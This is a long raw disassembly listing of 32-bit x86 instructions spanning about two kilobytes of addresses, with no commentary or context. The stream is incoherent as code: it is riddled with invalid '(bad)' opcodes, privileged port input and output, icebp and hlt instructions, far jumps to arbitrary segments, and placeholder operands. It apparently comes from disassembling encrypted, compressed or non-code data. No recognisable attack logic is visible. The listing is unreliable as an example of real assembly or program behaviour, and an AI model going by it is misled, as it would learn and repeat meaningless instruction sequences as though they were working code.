  411f9e:	jnp    0x411f82
  411fa0:	jle    0x411fa2
  411fa2:	xchg   bl,cl
  411fa4:	dec    ebp
  411fa5:	icebp  
  411fa6:	addr16 add eax,0xdeaad959
  411fac:	xor    al,0x95
  411fae:	jbe    0x411f8e
  411fb0:	fst    DWORD PTR [ecx-0x46fdc3c]
  411fb6:	imul   edi,DWORD PTR [edx-0x14],0xffffffec
  411fba:	call   0x4891:0xcbfc3f4f
  411fc1:	mov    ecx,0x704d6f98
  411fc6:	and    DWORD PTR [ebx-0x34b8d8b7],0x5a
  411fcd:	aad    0x41
  411fcf:	in     eax,dx
  411fd0:	sub    DWORD PTR [ebp-0x46],ecx
  411fd3:	jle    0x411f9b
  411fd5:	and    cl,BYTE PTR [edx]
  411fd7:	test   al,0x93
  411fd9:	ret    
  411fda:	in     al,dx
  411fdb:	xchg   BYTE PTR ds:0xecceff32,cl
  411fe1:	cld    
  411fe2:	sub    al,BYTE PTR [esi+0x52]
  411fe5:	add    esp,edi
  411fe7:	stos   BYTE PTR es:[edi],al
  411fe8:	jmp    0xd337a083
  411fed:	cld    
  411fee:	std    
  411fef:	call   0xc0cd98b0
  411ff4:	xchg   edi,eax
  411ff5:	pop    esp
  411ff6:	js     0x411fcb
  411ff8:	loop   0x412048
  411ffa:	sbb    BYTE PTR [ebx-0x7c],bl
  411ffd:	xor    al,0xa5
  411fff:	fsubr  st,st(2)
  412001:	test   DWORD PTR [edi-0x189f5edb],ebp
  412007:	xchg   ebp,eax
  412008:	(bad)  
  41200a:	mul    DWORD PTR [esi+0x4]
  41200d:	sbb    al,0xab
  41200f:	add    BYTE PTR [edx+0x466c4a23],bh
  412015:	pop    es
  412016:	pop    ebp
  412017:	cmp    BYTE PTR [ecx+0x60],0xd4
  41201b:	jmp    0xa063:0x2cf701f9
  412022:	add    ebx,eax
  412024:	aas    
  412025:	and    DWORD PTR [eax-0x4c838c6b],0x12
  41202c:	inc    ebp
  41202d:	and    cl,BYTE PTR [edi+0x78]
  412030:	gs out dx,al
  412032:	lea    edx,[edx]
  412034:	jb     0x412063
  412036:	dec    eax
  412037:	scas   al,BYTE PTR es:[edi]
  412038:	mov    al,0x83
  41203a:	outs   dx,BYTE PTR ds:[esi]
  41203b:	div    DWORD PTR [ebx-0x32]
  41203e:	or     ebx,DWORD PTR [ebx+0x76]
  412041:	out    dx,al
  412042:	xchg   edx,eax
  412043:	sbb    al,0x79
  412045:	pop    esp
  412046:	addr16 jae 0x4120b4
  412049:	mov    esi,0x9535d182
  41204e:	sar    DWORD PTR [edi],1
  412050:	jle    0x412075
  412052:	lods   eax,DWORD PTR ds:[esi]
  412053:	cdq    
  412054:	aad    0x1f
  412056:	jno    0x4120cb
  412058:	mov    dl,0xef
  41205a:	les    ebx,FWORD PTR [edx-0x474beb36]
  412060:	inc    edi
  412061:	or     BYTE PTR [eax],dl
  412063:	mov    DWORD PTR [esi],esp
  412065:	push   eax
  412066:	cs ja  0x411ff7
  412069:	mov    DWORD PTR [ebx+0x1b8338de],eax
  41206f:	cld    
  412070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412071:	rcl    BYTE PTR [ebx-0x751be788],0x40
  412078:	stos   DWORD PTR es:[edi],eax
  412079:	sbb    eax,edi
  41207b:	add    al,0x30
  41207d:	dec    esp
  41207e:	mov    bl,0x67
  412080:	loop   0x412044
  412082:	jno    0x4120c2
  412084:	inc    eax
  412085:	enter  0xdcaa,0x93
  412089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41208a:	js     0x412025
  41208c:	(bad)  
  41208d:	pop    ebx
  41208e:	ja     0x4120e4
  412090:	inc    ebx
  412091:	push   edi
  412092:	mov    ss,WORD PTR [edx]
  412094:	loope  0x4120ed
  412096:	cmp    bh,bl
  412098:	mov    ebx,DWORD PTR [eax+0x4000dfcc]
  41209e:	inc    ebx
  41209f:	lods   al,BYTE PTR ds:[esi]
  4120a0:	ins    BYTE PTR es:[edi],dx
  4120a1:	cmp    DWORD PTR [edi+0xf5a2310],esp
  4120a7:	lock fisttp WORD PTR [esi-0x60b8494c]
  4120ae:	add    al,0x1a
  4120b0:	push   ds
  4120b1:	xchg   esp,eax
  4120b2:	outs   dx,DWORD PTR ds:[esi]
  4120b3:	mov    ds:0xb98c8d89,al
  4120b8:	push   esi
  4120b9:	or     eax,0x501225f4
  4120be:	ins    BYTE PTR es:[edi],dx
  4120bf:	lds    eax,FWORD PTR [ebx+0x7bad8166]
  4120c5:	dec    ecx
  4120c6:	aad    0x6c
  4120c8:	loope  0x4120a5
  4120ca:	mov    dh,0xdb
  4120cc:	retf   
  4120cd:	cmc    
  4120ce:	test   al,0x9
  4120d0:	popf   
  4120d1:	add    bh,dl
  4120d3:	xor    DWORD PTR [ebp+0x55],edi
  4120d6:	fistp  DWORD PTR [edi-0xa783157]
  4120dc:	add    ch,BYTE PTR [edi+ebp*8-0x10]
  4120e0:	xchg   ecx,eax
  4120e1:	push   esi
  4120e2:	rcr    ebp,cl
  4120e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120e5:	jmp    0x4120bf
  4120e7:	adc    eax,0x5da95bec
  4120ec:	dec    edx
  4120ed:	jle    0x4120c5
  4120ef:	lahf   
  4120f0:	das    
  4120f1:	xor    dh,BYTE PTR [ebp-0x65]
  4120f4:	push   ss
  4120f5:	call   0x34cf793a
  4120fa:	jbe    0x4120f8
  4120fc:	ds xchg edx,eax
  4120fe:	addr16 inc esp
  412100:	dec    ecx
  412101:	loop   0x4120e0
  412103:	mov    WORD PTR [ebx],fs
  412105:	fsubr  QWORD PTR [edi+0x10]
  412108:	icebp  
  412109:	mov    BYTE PTR [edi-0x66],al
  41210c:	inc    ebp
  41210d:	cli    
  41210e:	push   esi
  41210f:	add    eax,0x2ad4c5e
  412114:	inc    eax
  412115:	mov    edi,0x4a9f1534
  41211a:	xchg   esi,eax
  41211b:	mov    WORD PTR [esi],fs
  41211d:	fimul  WORD PTR [ecx+0x4c]
  412120:	test   eax,0xf08a150e
  412125:	iret   
  412126:	inc    esi
  412127:	jg     0x412185
  412129:	lock pop edi
  41212b:	popf   
  41212c:	pusha  
  41212d:	dec    ebp
  41212e:	and    ah,cl
  412130:	xchg   edx,eax
  412131:	dec    ecx
  412132:	dec    eax
  412133:	nop
  412134:	rol    BYTE PTR [edx+0x3f640310],1
  41213a:	fwait
  41213b:	add    DWORD PTR [ebp+ebp*2+0x7b3b3e7f],edi
  412142:	aaa    
  412143:	mov    WORD PTR [ebp+0x2d],gs
  412146:	xor    al,0xf6
  412148:	pop    eax
  412149:	inc    ebp
  41214a:	inc    ebx
  41214b:	cmc    
  41214c:	or     eax,0x58f25451
  412151:	cwde   
  412152:	out    0xfc,eax
  412154:	clc    
  412155:	mov    dl,0x9f
  412157:	mov    ah,0xda
  412159:	popa   
  41215a:	sti    
  41215b:	vmread edx,ecx
  41215e:	addr16 mov dl,0x15
  412161:	fwait
  412162:	std    
  412163:	and    eax,0x73ecb12
  412168:	mov    eax,0x94a20c0d
  41216d:	in     eax,dx
  41216e:	fwait
  41216f:	cld    
  412170:	xor    dh,BYTE PTR [ecx+0x30ab2966]
  412176:	mov    ds:0x57bfe51c,al
  41217b:	adc    eax,0xb92313c3
  412180:	inc    esi
  412181:	fmul   QWORD PTR [eax+0xbd254ca]
  412187:	jb     0x412168
  412189:	inc    ebx
  41218a:	dec    edx
  41218b:	jp     0x412115
  41218d:	nop
  41218e:	push   edx
  41218f:	mov    dl,0x11
  412191:	lds    ecx,FWORD PTR [esi+0x69e174dd]
  412197:	cmp    al,0x46
  412199:	aad    0x22
  41219b:	push   edi
  41219c:	push   ecx
  41219d:	push   eax
  41219e:	aas    
  41219f:	xor    eax,0x411bc3fe
  4121a4:	(bad)  
  4121a6:	push   0xfffffff2
  4121a8:	add    DWORD PTR [edx-0x11],edi
  4121ab:	icebp  
  4121ac:	xchg   edx,eax
  4121ad:	je     0x4121c5
  4121af:	fcomp  DWORD PTR ds:0x6560b9c9
  4121b5:	test   BYTE PTR ds:[edi-0x2c2cb5b5],dh
  4121bc:	bnd jmp 0x41216a
  4121bf:	mov    ah,0xcf
  4121c1:	mov    dl,0x2d
  4121c3:	push   ebx
  4121c4:	ds addr16 mov eax,0x298b1c0c
  4121cb:	mov    eax,0xc11b04f2
  4121d0:	inc    esp
  4121d1:	or     eax,0x682ecff5
  4121d6:	js     0x4121eb
  4121d8:	mov    BYTE PTR [esi],bl
  4121da:	cs xchg ebp,eax
  4121dc:	mov    al,0x45
  4121de:	out    0x52,eax
  4121e0:	dec    edi
  4121e1:	jmp    0x41220d
  4121e3:	in     al,0x3a
  4121e5:	dec    esp
  4121e6:	out    dx,al
  4121e7:	mov    dh,0x28
  4121e9:	enter  0xa694,0x89
  4121ed:	push   esi
  4121ee:	jnp    0x4121f0
  4121f0:	and    eax,0xf02323b7
  4121f5:	sar    DWORD PTR [ecx-0x4049619e],cl
  4121fb:	pop    ds
  4121fc:	fbld   TBYTE PTR [esp+ecx*2-0xb]
  412200:	mov    ebx,0x835a8de3
  412205:	add    DWORD PTR [edi+0x46fa2432],0x47
  41220c:	xchg   dh,al
  41220e:	leave  
  41220f:	mov    ds:0x8acfbc01,eax
  412214:	add    BYTE PTR [esi],cl
  412216:	stc    
  412217:	in     al,dx
  412218:	mov    edx,0x77d8ec79
  41221d:	shl    dh,cl
  41221f:	and    dh,BYTE PTR [ecx]
  412221:	leave  
  412222:	jo     0x4121e3
  412224:	pop    esp
  412225:	adc    eax,0x4a7834d1
  41222a:	mov    ds:0x337e16ec,eax
  41222f:	mov    WORD PTR [ebx+0x78b53cf9],?
  412235:	sahf   
  412236:	(bad)  
  412237:	icebp  
  412238:	dec    ebp
  412239:	lahf   
  41223a:	pop    ebp
  41223b:	mov    ch,0x74
  41223d:	or     BYTE PTR [ebx-0x6c9cf775],cl
  412243:	push   ebp
  412244:	sbb    DWORD PTR [eax-0x4c],edx
  412247:	ins    DWORD PTR es:[edi],dx
  412248:	xchg   edx,eax
  412249:	in     eax,dx
  41224a:	xchg   ecx,eax
  41224b:	inc    ebx
  41224c:	mov    ebp,0xe332447f
  412251:	or     al,0x52
  412253:	out    dx,eax
  412254:	xor    BYTE PTR ds:0xa49aa1fb,ch
  41225a:	dec    eax
  41225b:	add    cl,ch
  41225d:	cmp    BYTE PTR [ecx-0x39a30c12],cl
  412263:	retf   
  412264:	(bad)  
  412265:	mov    DWORD PTR [ebp+eax*1+0x11],0x1057f47f
  41226d:	addr16 mov dl,0x10
  412270:	cdq    
  412271:	xchg   esi,eax
  412272:	test   eax,0xe7156006
  412277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412278:	lods   al,BYTE PTR ds:[esi]
  412279:	imul   BYTE PTR [ecx]
  41227b:	sahf   
  41227c:	mov    al,ds:0x46a9961b
  412281:	jmp    0x4122c9
  412283:	ret    0x92c2
  412286:	pushf  
  412287:	adc    ecx,DWORD PTR [ebx+0x2f]
  41228a:	pop    es
  41228b:	mov    cl,BYTE PTR [eax]
  41228d:	outs   dx,DWORD PTR ds:[esi]
  41228e:	ror    BYTE PTR [edx-0x5cae74e7],1
  412294:	mov    bh,0x82
  412296:	clc    
  412297:	fmul   DWORD PTR [ebp+eiz*8+0x20]
  41229b:	test   al,0xcb
  41229d:	ds stos DWORD PTR es:[edi],eax
  41229f:	fwait
  4122a0:	ret    
  4122a1:	es sbb eax,0x875a57d6
  4122a7:	daa    
  4122a8:	(bad)  
  4122a9:	jl     0x412299
  4122ab:	cli    
  4122ac:	loop   0x412304
  4122ae:	cdq    
  4122af:	pop    edx
  4122b0:	mov    ebp,0xd13e31e7
  4122b5:	test   eax,0x21c2d651
  4122ba:	xlat   BYTE PTR ds:[ebx]
  4122bb:	inc    esi
  4122bc:	inc    eax
  4122bd:	dec    edi
  4122be:	popa   
  4122bf:	mov    esi,0x64c6efcc
  4122c4:	(bad)  
  4122c5:	xor    al,0xed
  4122c7:	shr    DWORD PTR [esi+0x65],cl
  4122ca:	fsubr  DWORD PTR [esi-0x420055ec]
  4122d0:	fwait
  4122d1:	(bad)  
  4122d2:	xlat   BYTE PTR ds:[ebx]
  4122d3:	push   ds
  4122d4:	retf   
  4122d5:	imul   ebx,DWORD PTR [edx+0x721a4220],0x739b729b
  4122df:	xchg   ecx,eax
  4122e0:	sub    eax,0x78a3e567
  4122e5:	jl     0x412296
  4122e7:	nop
  4122e8:	mov    edx,0x6f14ecd3
  4122ed:	dec    ebp
  4122ee:	sub    al,0xd3
  4122f0:	in     al,0xd0
  4122f2:	and    eax,0x40d7fac6
  4122f7:	dec    esi
  4122f8:	dec    edi
  4122f9:	mov    ds:0x8649afff,al
  4122fe:	aad    0x55
  412300:	out    dx,eax
  412301:	adc    ah,dh
  412303:	aam    0x56
  412305:	dec    eax
  412306:	jmp    0x412296
  412308:	add    DWORD PTR [ebp-0x4ff3c7a1],ecx
  41230e:	cs loope 0x4122db
  412311:	pop    ebx
  412312:	aas    
  412313:	outs   dx,BYTE PTR ds:[esi]
  412314:	fmul   DWORD PTR [esi+0x70f4aed6]
  41231a:	out    dx,eax
  41231b:	(bad)  
  41231c:	fst    st(3)
  41231e:	add    edx,DWORD PTR [ebx+0x45]
  412321:	pop    es
  412322:	out    0x29,al
  412324:	iret   
  412325:	pushf  
  412326:	sti    
  412327:	repz retf 0x31f9
  41232b:	dec    ebx
  41232c:	sti    
  41232d:	inc    ebx
  41232e:	and    dl,bh
  412330:	outs   dx,BYTE PTR ds:[esi]
  412331:	int3   
  412332:	fwait
  412333:	sbb    BYTE PTR [ebx-0x30],0xb6
  412337:	cmp    al,0x53
  412339:	and    dl,BYTE PTR [esi+eax*8+0x3f]
  41233d:	idiv   ch
  41233f:	jno    0x4123b7
  412341:	rcl    BYTE PTR [edx-0x79],1
  412344:	pop    edx
  412345:	mov    esi,0xcc63ab03
  41234a:	fisttp DWORD PTR [ecx-0x7d194cca]
  412350:	ins    DWORD PTR es:[edi],dx
  412351:	mov    ch,BYTE PTR [edi]
  412353:	xchg   ecx,eax
  412354:	lods   al,BYTE PTR ds:[esi]
  412355:	mov    cl,0xd8
  412357:	cmp    DWORD PTR [ecx+edx*8],ebp
  41235a:	aad    0x1b
  41235c:	fst    DWORD PTR [esp+ebp*8-0x5c5e36cf]
  412363:	test   ecx,edx
  412365:	out    0x2b,al
  412367:	repnz mov dh,0xf
  41236a:	mov    eax,0x4c59da41
  41236f:	nop
  412370:	jns    0x41232d
  412372:	or     bl,dl
  412374:	test   al,dl
  412376:	add    BYTE PTR [edi-0xf],bl
  412379:	mov    eax,ds:0xb2c79855
  41237e:	sbb    eax,0xa7c2b23a
  412383:	mov    WORD PTR [edi-0x3b790fd8],fs
  412389:	adc    DWORD PTR ds:0x898b6d06,eax
  41238f:	dec    eax
  412390:	jg     0x412364
  412392:	test   edi,ebx
  412394:	push   cs
  412395:	xor    al,0xc1
  412397:	shr    DWORD PTR [edi-0x54],cl
  41239a:	push   ebx
  41239b:	repz pop edx
  41239d:	cmp    cl,BYTE PTR [ecx]
  41239f:	pop    ebp
  4123a0:	mov    ecx,0x60d3465a
  4123a5:	fldcw  WORD PTR [edx+0x42891c70]
  4123ab:	pop    ebx
  4123ac:	xchg   DWORD PTR ds:0x94276c82,edx
  4123b2:	xchg   ecx,esi
  4123b4:	jb     0x412338
  4123b6:	cli    
  4123b7:	rol    DWORD PTR [edx],0xc6
  4123ba:	mov    BYTE PTR [edx+0x3f],bl
  4123bd:	rcr    ah,cl
  4123bf:	iret   
  4123c0:	push   ds
  4123c1:	lahf   
  4123c2:	leave  
  4123c3:	cdq    
  4123c4:	repnz in eax,0x22
  4123c7:	xchg   edx,eax
  4123c8:	xchg   edx,eax
  4123c9:	in     al,dx
  4123ca:	mov    al,0x1c
  4123cc:	mov    cl,0x82
  4123ce:	sub    eax,0x8f8c5cd4
  4123d3:	sbb    bl,BYTE PTR [ebx+0x744b8ae8]
  4123d9:	sub    DWORD PTR [edx],edi
  4123db:	icebp  
  4123dc:	sbb    BYTE PTR [edx+esi*2-0x41b2c2cc],ch
  4123e3:	sub    al,0xb6
  4123e5:	sbb    ebx,ecx
  4123e7:	(bad)  
  4123e8:	gs into 
  4123ea:	jo     0x41243a
  4123ec:	pop    ebp
  4123ed:	fdivr  QWORD PTR [edx+eiz*1-0xa4dc27c]
  4123f4:	add    DWORD PTR [eax],ebx
  4123f6:	outs   dx,BYTE PTR ds:[esi]
  4123f7:	add    BYTE PTR [edi-0x1593055c],0x73
  4123fe:	mov    ?,ecx
  412400:	fdiv   QWORD PTR [ebx+eiz*4-0x3c]
  412404:	add    BYTE PTR [ebx-0x13],cl
  412407:	jo     0x4123c1
  412409:	pop    eax
  41240a:	xchg   ebx,eax
  41240b:	xchg   ecx,eax
  41240c:	push   esp
  41240d:	cmc    
  41240e:	dec    ecx
  41240f:	push   edx
  412410:	pop    ebx
  412411:	outs   dx,DWORD PTR ds:[esi]
  412412:	inc    ecx
  412413:	das    
  412414:	jno    0x4123b3
  412416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412417:	fiadd  DWORD PTR [esi+0x10]
  41241a:	jae    0x4123ff
  41241c:	inc    esi
  41241d:	adc    ecx,DWORD PTR [ebx-0x23]
  412420:	mov    ds:0x5981cb1,eax
  412425:	and    bh,dh
  412427:	or     esp,DWORD PTR ds:0x9d33f31e
  41242d:	sub    eax,0xc2d8a147
  412432:	jo     0x412467
  412434:	daa    
  412435:	outs   dx,DWORD PTR ds:[esi]
  412436:	gs sub eax,0x1caeaf7e
  41243c:	push   eax
  41243d:	xchg   ebp,eax
  41243e:	or     al,BYTE PTR [ebp-0x526e33f2]
  412444:	test   al,0xc8
  412446:	imul   ebx,DWORD PTR cs:[eax-0x73],0x71
  41244b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41244c:	int3   
  41244d:	xchg   edx,eax
  41244e:	push   edi
  41244f:	daa    
  412450:	inc    edi
  412451:	scas   al,BYTE PTR es:[edi]
  412452:	pop    ebp
  412453:	fmul   QWORD PTR [esi-0x773be983]
  412459:	hlt    
  41245a:	inc    esp
  41245b:	dec    ebx
  41245c:	push   ebx
  41245d:	push   ss
  41245e:	add    BYTE PTR [ecx+0x75],0xeb
  412462:	xchg   esi,eax
  412463:	ret    
  412464:	mov    ecx,eax
  412466:	stos   DWORD PTR es:[edi],eax
  412467:	jo     0x412439
  412469:	stos   DWORD PTR es:[edi],eax
  41246a:	lock imul eax,DWORD PTR [esi-0x55],0x239ad789
  412472:	push   ebp
  412473:	dec    eax
  412474:	icebp  
  412475:	mov    edx,0x28de2101
  41247a:	xor    al,0x62
  41247c:	cmp    dh,BYTE PTR [eax+0x2b]
  41247f:	jo     0x4124ba
  412481:	and    BYTE PTR [edi+0x1d],al
  412484:	bound  esi,QWORD PTR [eax-0x3eeb1248]
  41248a:	sbb    esi,DWORD PTR [ebp-0x57721906]
  412490:	dec    eax
  412491:	pop    esi
  412492:	mov    ds:0xe1642fa1,al
  412497:	mov    bh,0x56
  412499:	pop    ebp
  41249a:	mov    ebx,0xc06914e1
  41249f:	cwde   
  4124a0:	jo     0x412492
  4124a2:	test   BYTE PTR [ebx],ah
  4124a4:	jo     0x412496
  4124a6:	cs cs jno 0x4124f2
  4124aa:	rcr    BYTE PTR [ecx-0x498453fa],1
  4124b0:	cmp    DWORD PTR ds:0x3caa5a5a,esi
  4124b6:	imul   ebp
  4124b8:	and    di,ax
  4124bb:	mov    al,BYTE PTR [eax+0x2d]
  4124be:	pushf  
  4124bf:	and    bl,BYTE PTR [edx+0x35f4c310]
  4124c5:	adc    eax,0x886699f4
  4124ca:	jne    0x4124a3
  4124cc:	mov    BYTE PTR [edi-0x3330651c],dl
  4124d2:	push   esi
  4124d3:	inc    ebx
  4124d4:	sbb    BYTE PTR [eax],cl
  4124d6:	cli    
  4124d7:	cli    
  4124d8:	jnp    0x41253d
  4124da:	cmc    
  4124db:	call   0x26f9:0xe3233e1b
  4124e2:	mov    ?,edx
  4124e4:	lea    edi,[ebx+0x2]
  4124e7:	push   ebp
  4124e8:	pop    edi
  4124e9:	mov    al,0x69
  4124eb:	or     ebp,eax
  4124ed:	call   0x5c598ce4
  4124f2:	xchg   esi,eax
  4124f3:	sub    ebp,DWORD PTR [edx]
  4124f5:	cmc    
  4124f6:	jmp    0x36c4:0xc8467fc5
  4124fd:	xchg   DWORD PTR [edi+eiz*2-0x77],esi
  412501:	mov    al,0xee
  412503:	imul   esp,DWORD PTR [edi+edx*2],0xdf3cfada
  41250a:	xchg   esp,eax
  41250b:	loop   0x41251b
  41250d:	pop    eax
  41250e:	push   esp
  41250f:	inc    esi
  412510:	sbb    eax,DWORD PTR [esi]
  412512:	add    al,0xf2
  412514:	push   cs
  412515:	xor    eax,0xffaa487c
  41251a:	(bad)  
  41251b:	cld    
  41251c:	and    BYTE PTR [ebp-0x1c3aa3fe],bl
  412522:	jns    0x412573
  412524:	add    BYTE PTR [ebp-0x78],ah
  412527:	push   es
  412528:	lods   al,BYTE PTR ds:[esi]
  412529:	sbb    DWORD PTR [edx-0x14712c],ebp
  41252f:	sub    ebx,edi
  412531:	and    al,0x96
  412533:	adc    DWORD PTR [eax-0x20],edi
  412536:	xor    eax,0xf58968e2
  41253b:	mov    eax,ds:0x479695ae
  412540:	out    0x91,al
  412542:	mov    bh,0xfb
  412544:	test   ebp,esp
  412546:	not    DWORD PTR [ebx-0x42]
  412549:	loope  0x412555
  41254b:	xchg   esi,eax
  41254c:	into   
  41254d:	inc    ecx
  41254e:	xchg   ecx,eax
  41254f:	(bad)  
  412551:	lds    esi,FWORD PTR [ebp-0x606f7d9e]
  412557:	adc    DWORD PTR [edi],ebp
  412559:	mov    ebx,0x23abc067
  41255e:	sub    edi,ecx
  412560:	push   ss
  412561:	hlt    
  412562:	mov    bl,0x8f
  412564:	push   ss
  412565:	adc    BYTE PTR [ebx],cl
  412567:	sbb    al,0xd5
  412569:	xchg   ebp,eax
  41256a:	test   DWORD PTR [ecx-0x1b],eax
  41256d:	scas   al,BYTE PTR es:[edi]
  41256e:	repz ret 
  412570:	data16 mov dh,0x97
  412573:	ds std 
  412575:	jae    0x41256f
  412577:	mov    edi,0x1f6deb9
  41257c:	call   0xa0fd:0xb20a50e6
  412583:	pop    ecx
  412584:	paddb  mm5,QWORD PTR [eax+0x7b447120]
  41258b:	push   ecx
  41258c:	out    dx,eax
  41258d:	pop    ebx
  41258e:	out    dx,al
  41258f:	cld    
  412590:	sbb    BYTE PTR [edi],dl
  412592:	xor    edx,0x6490ba12
  412598:	cmp    DWORD PTR [edi-0x3],eax
  41259b:	adc    al,0x63
  41259d:	sub    DWORD PTR [ecx+eax*2+0x8],esp
  4125a1:	adc    bl,BYTE PTR [edx+0x3]
  4125a4:	call   0x263e:0x8d431ba2
  4125ab:	or     ecx,DWORD PTR [ebp-0x62]
  4125ae:	xor    bl,cl
  4125b0:	les    ecx,FWORD PTR ds:0x6e71d2e5
  4125b6:	test   al,0x2e
  4125b8:	fsub   QWORD PTR ds:0xdf1c9997
  4125be:	rcl    esp,cl
  4125c0:	fwait
  4125c1:	ins    BYTE PTR es:[edi],dx
  4125c2:	xchg   BYTE PTR [ecx],bh
  4125c4:	dec    edi
  4125c5:	push   ecx
  4125c6:	pop    edi
  4125c7:	out    dx,al
  4125c8:	repz bound esi,QWORD PTR [ebx]
  4125cb:	cmc    
  4125cc:	and    ebp,DWORD PTR [edx+edx*1-0x54]
  4125d0:	xchg   DWORD PTR [ebp+0x54],edi
  4125d3:	jp     0x4125db
  4125d5:	jno    0x412573
  4125d7:	sub    DWORD PTR [ebp+0x41],ecx
  4125da:	fwait
  4125db:	and    bl,BYTE PTR [edi]
  4125dd:	sub    al,0xa9
  4125df:	aas    
  4125e0:	ins    DWORD PTR es:[edi],dx
  4125e1:	dec    edx
  4125e2:	pop    ebx
  4125e3:	mov    eax,0xaef9c38
  4125e8:	mov    dh,0xf2
  4125ea:	call   0x3bd4:0x3a5df0fd
  4125f1:	lea    esi,[edx]
  4125f3:	mov    ebp,0xa4e7e951
  4125f8:	push   ebp
  4125f9:	sub    BYTE PTR [ecx],0xd9
  4125fc:	adc    DWORD PTR [edi+0x5fd5c076],ebp
  412602:	repz test edx,esp
  412605:	imul   esi,DWORD PTR [ecx],0x75
  412608:	sbb    DWORD PTR [edi-0x1e],esi
  41260b:	clc    
  41260c:	pop    eax
  41260d:	bound  ecx,QWORD PTR [ecx+0xd]
  412610:	shr    DWORD PTR [esi+ecx*1],1
  412613:	mov    ds:0x148f7bf3,al
  412618:	in     eax,0x19
  41261a:	into   
  41261b:	mov    edx,0x577c102e
  412620:	mov    dh,BYTE PTR [eax]
  412622:	in     eax,dx
  412623:	or     eax,0x139827a9
  412628:	(bad)  
  412629:	inc    edi
  41262a:	cmp    BYTE PTR [edi],0xc1
  41262d:	test   al,0x2b
  41262f:	adc    BYTE PTR [edi-0x4e],cl
  412632:	lock push ebx
  412634:	mov    bh,0xb1
  412636:	cli    
  412637:	lods   eax,DWORD PTR ds:[esi]
  412638:	inc    edx
  412639:	cli    
  41263a:	inc    esi
  41263b:	lock jle 0x412615
  41263e:	add    DWORD PTR ss:[esi-0x13],ebp
  412642:	imul   esp,DWORD PTR [esi],0x744bfdce
  412648:	repnz dec esi
  41264a:	nop
  41264b:	jne    0x4126ba
  41264d:	daa    
  41264e:	push   0xffffffd2
  412650:	pop    ss
  412651:	sub    DWORD PTR [eax+ebp*1-0x2e17fe4f],eax
  412658:	jo     0x41265e
  41265a:	lahf   
  41265b:	jle    0x412630
  41265d:	pop    eax
  41265e:	mov    ds:0x24da50c7,al
  412663:	xchg   ecx,eax
  412664:	ror    DWORD PTR [edx+eax*1-0x3b],1
  412668:	xchg   esp,eax
  412669:	nop
  41266a:	push   ecx
  41266b:	mov    ecx,0x58ab408a
  412670:	nop
  412671:	lods   eax,DWORD PTR ds:[esi]
  412672:	and    al,0xfa
  412674:	push   0x56
  412676:	cmp    ebx,DWORD PTR [ebp+0xc0510b]
  41267c:	out    dx,eax
  41267d:	sbb    edi,esp
  41267f:	dec    ecx
  412680:	mov    ds:0x68fe7ada,eax
  412685:	xchg   ecx,eax
  412686:	jno    0x4126cd
  412688:	or     DWORD PTR ds:0xef1b5f7f,esp
  41268e:	xchg   ebx,eax
  41268f:	add    eax,0xd75d043
  412694:	mov    es,WORD PTR ds:0x71f600bf
  41269a:	mov    ds:0x4c670c31,eax
  41269f:	jp     0x41269c
  4126a1:	sbb    al,0xc0
  4126a3:	mov    ebp,0xbd4a7db3
  4126a8:	cmp    BYTE PTR [esi],dl
  4126aa:	mov    ecx,0x6dabdd80
  4126af:	ins    DWORD PTR es:[edi],dx
  4126b0:	mov    ah,0xbf
  4126b2:	push   0xffffffce
  4126b4:	cwde   
  4126b5:	mov    DWORD PTR [esi],esp
  4126b7:	mov    ah,0xbc
  4126b9:	in     al,0x84
  4126bb:	mov    eax,0xec0308b
  4126c0:	retf   0x8f84
  4126c3:	jns    0x412680
  4126c5:	sub    esi,DWORD PTR [esi+esi*2+0x395918cc]
  4126cc:	repz sub BYTE PTR [edi],dl
  4126cf:	outs   dx,BYTE PTR ds:[esi]
  4126d0:	dec    eax
  4126d1:	cmp    esp,DWORD PTR [ebx+0x3084c51a]
  4126d7:	cwde   
  4126d8:	stc    
  4126d9:	leave  
  4126da:	mov    ds:0x7c3b1a63,eax
  4126df:	fadd   QWORD PTR [edi+0x22995ce9]
  4126e5:	int3   
  4126e6:	loop   0x412701
  4126e8:	pop    ecx
  4126e9:	mov    ebp,0xa47dcaf8
  4126ee:	or     ecx,ebp
  4126f0:	arpl   WORD PTR [ecx-0x6d2751ab],si
  4126f6:	sub    ah,dl
  4126f8:	sub    eax,0x716c5bfd
  4126fd:	xchg   esi,eax
  4126fe:	stos   DWORD PTR es:[edi],eax
  4126ff:	or     bh,BYTE PTR [edi]
  412701:	(bad)  
  412702:	and    bl,BYTE PTR [edi+0x292c449e]
  412708:	pop    ecx
  412709:	mov    edi,0x92bd6ef8
  41270e:	fldenv [ebx+0x50c20406]
  412714:	sbb    edx,edx
  412716:	or     DWORD PTR [ebp-0x5e067637],ebx
  41271c:	test   DWORD PTR [ecx+0x73c22ba9],edx
  412722:	push   ds
  412723:	aas    
  412724:	(bad)
  412727:	or     BYTE PTR [esi+ecx*2-0x1a],al
  41272b:	gs in  al,dx
  41272d:	mov    cl,0x92
  41272f:	and    DWORD PTR [ecx-0x70],esi
  412732:	inc    esp
  412733:	xor    ebp,DWORD PTR [ecx-0x62824cae]
  412739:	sub    ebx,DWORD PTR [edx-0x7c]
  41273c:	xor    eax,0x115f3cf3
  412741:	lods   al,BYTE PTR ds:[esi]
  412742:	(bad)  
  412747:	leave  
  412748:	je     0x4127b9
  41274a:	dec    esp
  41274b:	xchg   edx,eax
  41274c:	fbld   TBYTE PTR [ecx-0x3a]
  41274f:	loop   0x4126e5
  412751:	mov    BYTE PTR [ecx-0x55675741],bh
  412757:	xchg   ecx,eax
  412758:	repz cli 
  41275a:	inc    esi
  41275b:	sti    
  41275c:	stos   DWORD PTR es:[edi],eax
  41275d:	jmp    0x960b4291
  412762:	xor    BYTE PTR [esi],0xed
  412765:	dec    esi
  412766:	mov    esi,0x6ab97823
  41276b:	xor    DWORD PTR [esi+0x2f],esp
  41276e:	cmp    bh,ah
  412770:	mul    BYTE PTR [edx+0x3139ef39]
  412776:	cmp    bl,BYTE PTR [ebp+0x342adfad]
  41277c:	fmul   st,st(6)
  41277e:	pop    ecx
  41277f:	ins    BYTE PTR es:[edi],dx
  412780:	mov    ebx,edi
  412782:	repz ja 0x4127e1
